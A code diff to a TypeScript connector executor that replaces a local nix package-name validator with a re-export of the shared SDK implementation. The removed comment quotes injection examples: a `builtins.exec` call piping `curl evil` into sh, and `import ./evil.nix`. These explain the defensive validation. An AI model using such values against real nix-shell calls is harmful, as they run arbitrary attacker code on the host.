+++ packages/connector-worker/src/executor/subprocess.ts
@@ -12,6 +12,7 @@ import { createRequire } from 'node:module';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import type { EventEnvelope } from '@lobu/connector-sdk';
+import { nixPackageAttrRef } from '@lobu/connector-sdk/nix-package';
 import type {
   ExecutionHooks,
   ExecutionOptions,
@@ -39,53 +40,9 @@ function shellQuote(value: string): string {
   return `'${value.replace(/'/g, `'\\''`)}'`;
 }
 
-// Kept in lockstep with the gateway's nixPackageAttrRef allow-list
-// (packages/server/src/gateway/orchestration/impl/embedded-deployment.ts).
-const NIX_PACKAGE_NAMESPACES = new Set([
-  'python3Packages',
-  'python311Packages',
-  'python312Packages',
-  'nodePackages',
-  'perlPackages',
-  'rubyPackages',
-  'haskellPackages',
-  'rPackages',
-  'ocamlPackages',
-  'luaPackages',
-]);
-const NIX_LEAF_RE = /^[a-z0-9_][a-z0-9_-]*$/;
-const NIX_ATTR_LEAF_RE = /^[a-zA-Z0-9_][a-zA-Z0-9_-]*$/;
-
-/**
- * Validate an operator/connector-declared nix package name and re-emit it as an
- * explicit `pkgs.<...>` attribute reference. `nix-shell -p` evaluates each
- * argument as a Nix *expression*, so an unvalidated value like
- * `x; builtins.exec ["sh" "-c" "curl evil|sh"]` or `import ./evil.nix` would
- * run arbitrary code at evaluation time. Mirrors the gateway-side
- * `nixPackageAttrRef` hardening so the connector path is not a weaker door.
- */
-export function nixPackageAttrRef(pkg: string): string {
-  if (typeof pkg !== 'string' || /[\s;&|`$(){}<>'"\\!*?#]/.test(pkg)) {
-    throw new Error(`Invalid nix package name: ${pkg}`);
-  }
-  const dot = pkg.indexOf('.');
-  if (dot === -1) {
-    if (!NIX_LEAF_RE.test(pkg)) {
-      throw new Error(`Invalid nix package name: ${pkg}`);
-    }
-    return `pkgs.${pkg}`;
-  }
-  const namespace = pkg.slice(0, dot);
-  const leaf = pkg.slice(dot + 1);
-  if (
-    !NIX_PACKAGE_NAMESPACES.has(namespace) ||
-    leaf.includes('.') ||
-    !NIX_ATTR_LEAF_RE.test(leaf)
-  ) {
-    throw new Error(`Invalid nix package name: ${pkg}`);
-  }
-  return `pkgs.${namespace}.${leaf}`;
-}
+// Re-exported for the executor's local tests; the canonical implementation
+// (shared with the gateway orchestrator) lives in @lobu/connector-sdk.
+export { nixPackageAttrRef };
 
 /**
  * exit_reason values surfaced to the runs table:
